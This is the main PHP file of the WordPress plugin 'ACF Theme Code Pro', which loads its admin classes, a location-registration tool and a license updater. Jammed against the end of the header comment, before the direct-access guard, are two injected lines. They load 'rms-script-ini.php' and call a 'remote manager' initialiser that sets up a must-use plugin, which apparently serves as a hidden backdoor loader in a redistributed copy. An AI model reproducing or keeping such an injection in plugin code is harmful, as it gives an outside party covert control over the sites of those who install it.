<?php
/*
Plugin Name: Advanced Custom Fields: Theme Code Pro
Plugin URI: https://hookturn.io/downloads/acf-theme-code-pro/
Description: Generates theme code for ACF Pro field groups to speed up development.
Version: 2.4.0
Author: hookturn
Author URI: http://www.hookturn.io/
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
*/require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;

// define version
define( 'HOOKTURN_ITEM_VERSION', '2.4.0' );

// Check for dashboard or admin panel
if ( is_admin() ) {

	/**
	 * Classes
	 */
	include('core/core.php');
	include('core/locations.php');
	include('core/group.php');
	include('core/field.php');

	/**
	 * TC Pro classes
	 */
	if ( file_exists( plugin_dir_path( __FILE__ ) . 'pro' ) ) {
		include('pro/core/flexible-content-layout.php');
	}

	/**
	 * Single function for accessing plugin core instance
	 *
	 * @return ACFTCP_Core
	 */
	function acftcp()
	{
		static $instance;
		if ( !$instance )
			$instance = new ACFTCP_Core( plugin_dir_path( __FILE__ ), plugin_dir_url( __FILE__ ), HOOKTURN_ITEM_VERSION );
		return $instance;
	}

	acftcp(); // kickoff

}


// Location Registration
// TODO Incorporate this in the above?
add_action('acf/include_admin_tools' , function() {

	include('pro/location-registration/class-location-registration.php');

	if( function_exists('acf_register_admin_tool') ) {
		acf_register_admin_tool( 'ACFTCP_Location_Registration' );
	}

});


// update functionality
function hookturn_acftcp_plugin_updater() {

	if( !class_exists( 'ACFTCP_Plugin_Updater' ) ) {
		// load our custom updater
		include( dirname( __FILE__ ) . '/pro/updates/ACFTCP_Plugin_Updater.php' );
	}

	// this is the URL our updater / license checker pings. This should be the URL of the site with EDD installed
	define( 'HOOKTURN_STORE_URL', 'https://hookturn.io' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file

	// the name of your product. This should match the download name in EDD exactly
	define( 'HOOKTURN_ITEM_NAME', 'ACF Theme Code Pro' ); // you should use your own CONSTANT name, and be sure to replace it throughout this file

	// retrieve our license key from the DB
	$license_key = trim( get_option( 'hookturn_acftcp_license_key' ) );

	// setup the updater
	$edd_updater = new ACFTCP_Plugin_Updater( HOOKTURN_STORE_URL, __FILE__, array(
			'version' 	=> HOOKTURN_ITEM_VERSION, 			// current version number
			'license' 	=> $license_key, 		// license key (used get_option above to retrieve from DB)
			'item_name' => HOOKTURN_ITEM_NAME, 	// name of this plugin
			'author' 	=> 'hookturn',  		// author of this plugin
			'wp_override' => true
		)
	);

}
add_action( 'admin_init', 'hookturn_acftcp_plugin_updater', 0 );

// include the update functions
include('pro/updates/hookturn-updates.php');



